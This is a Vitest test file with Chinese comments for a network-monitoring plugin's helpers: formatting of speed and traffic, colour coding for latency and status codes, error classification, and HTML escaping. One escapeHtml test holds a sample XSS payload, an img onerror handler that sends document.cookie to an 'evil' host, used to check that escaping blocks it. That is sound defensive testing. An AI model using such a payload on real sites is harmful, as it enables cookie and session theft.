/**
 * 模块职责：`collect/network.ts` 里纯函数的测试 —— 采样成形、配色分档、错误归纳、HTML 转义
 * 依赖方向：被测模块
 * 生命周期：测试
 * 注意事项：**`probeSites` 的并发队列不测。** 它要真发 HTTP 请求，测它等于测网络与对端站点
 *          （Google 在 CI 上时通时不通）。真要测就得把 `HttpClient` 整个换掉，那测的是
 *          那个替身而不是本插件。故这里只测它拆出来的纯函数，以及 `escapeHtml` ——
 *          那一处是模板里唯一把使用者可控文本放进不转义输出的地方，必须转义对。
 */

import { describe, expect, it } from "vitest"
import { delayColor, errorReason, escapeHtml, statusColor, toNetworkView } from "./network.js"

describe("toNetworkView", () => {
  it("速率与累计量都齐时都给", () => {
    const view = toNetworkView({
      iface: "eth0",
      rx_sec: 1024,
      tx_sec: 2048,
      rx_bytes: 1024 ** 2,
      tx_bytes: 2 * 1024 ** 2
    })
    expect(view).toBeDefined()
    expect(view?.speed.download).toEqual({ size: "1.00", suffix: " KB" })
    expect(view?.speed.upload).toEqual({ size: "2.00", suffix: " KB" })
    expect(view?.traffic?.download).toEqual({ size: "1.00", suffix: " MB" })
    expect(view?.traffic?.upload).toEqual({ size: "2.00", suffix: " MB" })
  })

  it("`showByte: false`：小于 1K 时不带 `B`（后面跟着 `/s`），大于 1K 的照常带", () => {
    // `showByte` 只管 B 那一档 —— 它的单位是多余的，而 KB / MB 的 `B` 是有信息量的
    const view = toNetworkView({ rx_sec: 512, tx_sec: 1024, rx_bytes: 1, tx_bytes: 1 })
    expect(view?.speed.download).toEqual({ size: "512", suffix: " B" })
    expect(view?.speed.upload).toEqual({ size: "1.00", suffix: " KB" })
  })

  it("没有采样时 undefined —— 模板据此隐去整个板块", () => {
    expect(toNetworkView(undefined)).toBeUndefined()
    expect(toNetworkView({})).toBeUndefined()
  })

  it("速率只有一半时不给速率（上行缺失会被读成上行真的是 0）", () => {
    expect(toNetworkView({ rx_sec: 1024 })).toBeUndefined()
    expect(toNetworkView({ tx_sec: 1024 })).toBeUndefined()
  })

  it("累计量全为 0 时不当成「没流量」而是「还没采到」", () => {
    // 刚启动时 `si` 给的累计量就是 0
    expect(toNetworkView({ rx_bytes: 0, tx_bytes: 0 })).toBeUndefined()
  })

  it("累计量只有一半时不出现累计量那一项", () => {
    const view = toNetworkView({ rx_sec: 1, tx_sec: 1, rx_bytes: 1024 })
    expect(view).toBeDefined()
    expect(view?.speed).toBeDefined()
    expect(view?.traffic).toBeUndefined()
  })

  it("有累计量无速率时只给累计量", () => {
    const view = toNetworkView({ rx_bytes: 1024, tx_bytes: 1024 })
    expect(view).toBeDefined()
    expect(view?.speed).toBeUndefined()
    expect(view?.traffic).toBeDefined()
  })

  it("非数字的字段被忽略", () => {
    // `si` 的字段在部分平台上会是 null 或字符串
    const view = toNetworkView({ rx_sec: null as unknown as number, tx_sec: 1 })
    expect(view).toBeUndefined()
  })
})

describe("delayColor", () => {
  it("快的是绿色", () => {
    expect(delayColor(0)).toBe("#188038")
    expect(delayColor(500)).toBe("#188038")
  })

  it("中档是橙色", () => {
    expect(delayColor(501)).toBe("#d68100")
    expect(delayColor(2000)).toBe("#d68100")
  })

  it("慢的是红色", () => {
    expect(delayColor(2001)).toBe("#F44336")
    expect(delayColor(60000)).toBe("#F44336")
  })

  it("边界不含糊", () => {
    expect(delayColor(500)).not.toBe(delayColor(501))
    expect(delayColor(2000)).not.toBe(delayColor(2001))
  })
})

describe("statusColor", () => {
  it("2xx 绿、3xx 橙、4xx 红、5xx 紫", () => {
    expect(statusColor(200)).toBe("#188038")
    expect(statusColor(301)).toBe("#FF9800")
    expect(statusColor(404)).toBe("#F44336")
    expect(statusColor(500)).toBe("#9C27B0")
  })

  it("1xx 是蓝色信息色", () => {
    expect(statusColor(100)).toBe("#03A9F4")
  })

  it("0 与负数给空串（没有颜色）", () => {
    expect(statusColor(0)).toBe("")
    expect(statusColor(-1)).toBe("")
  })

  it("4xx 与 5xx 颜色不同 —— 混成一色会让人排查错方向", () => {
    // 4xx 是「请求本身有问题」（网址填错了），5xx 是「对面挂了」
    expect(statusColor(404)).not.toBe(statusColor(503))
  })
})

describe("errorReason", () => {
  it("超时", () => {
    expect(errorReason(new Error("The operation was aborted"))).toBe("Timeout")
    const abort = new Error("boom")
    abort.name = "AbortError"
    expect(errorReason(abort)).toBe("Timeout")
  })

  it("按 errno 分类", () => {
    expect(errorReason(new Error("read ECONNRESET"))).toBe("Econnreset")
    expect(errorReason(new Error("getaddrinfo ENOTFOUND example.com"))).toBe("DNS")
    expect(errorReason(new Error("getaddrinfo EAI_AGAIN"))).toBe("DNS")
    expect(errorReason(new Error("connect ECONNREFUSED 127.0.0.1:80"))).toBe("Refused")
    expect(errorReason(new Error("self-signed certificate"))).toBe("TLS")
    expect(errorReason(new Error("unable to verify the first certificate"))).toBe("TLS")
    expect(errorReason(new Error("CERT_HAS_EXPIRED"))).toBe("TLS")
  })

  it("认不出的给通用标签", () => {
    expect(errorReason(new Error("something else"))).toBe("Error")
  })

  it("非 Error 给通用标签 —— 抛出的可能是个字符串", () => {
    expect(errorReason("bang")).toBe("Error")
    expect(errorReason(undefined)).toBe("Error")
    expect(errorReason(null)).toBe("Error")
    expect(errorReason({ message: "ECONNRESET" })).toBe("Error")
  })

  it("Econnreset 先于其它判断 —— 它的消息里通常也含 `connect`", () => {
    // 顺序反了会让 ECONNRESET 被归成别的
    expect(errorReason(new Error("connect ECONNRESET 1.2.3.4:443"))).toBe("Econnreset")
  })
})

describe("escapeHtml", () => {
  it("转义五个特殊字符", () => {
    expect(escapeHtml("<script>")).toBe("&lt;script&gt;")
    expect(escapeHtml(`"double"`)).toBe("&quot;double&quot;")
    expect(escapeHtml("'single'")).toBe("&#39;single&#39;")
    expect(escapeHtml("a & b")).toBe("a &amp; b")
  })

  it("`&` 先于其它替换 —— 否则会把刚生成的实体再转一遍", () => {
    // 顺序反了 `<` 会先变成 `&lt;`，再被 `&` 那条规则改成 `&amp;lt;`
    expect(escapeHtml("<")).toBe("&lt;")
    expect(escapeHtml("&lt;")).toBe("&amp;lt;")
  })

  it("普通文本与中文原样", () => {
    expect(escapeHtml("连接超时")).toBe("连接超时")
    expect(escapeHtml("abc123")).toBe("abc123")
  })

  it("挡住一条典型的注入串", () => {
    const evil = `<img src=x onerror="fetch('//evil/?c='+document.cookie)">`
    const out = escapeHtml(evil)
    expect(out).not.toContain("<")
    expect(out).not.toContain(">")
    expect(out).not.toContain('"')
    expect(out).toContain("&lt;img")
  })

  it("空串给空串", () => {
    expect(escapeHtml("")).toBe("")
  })
})
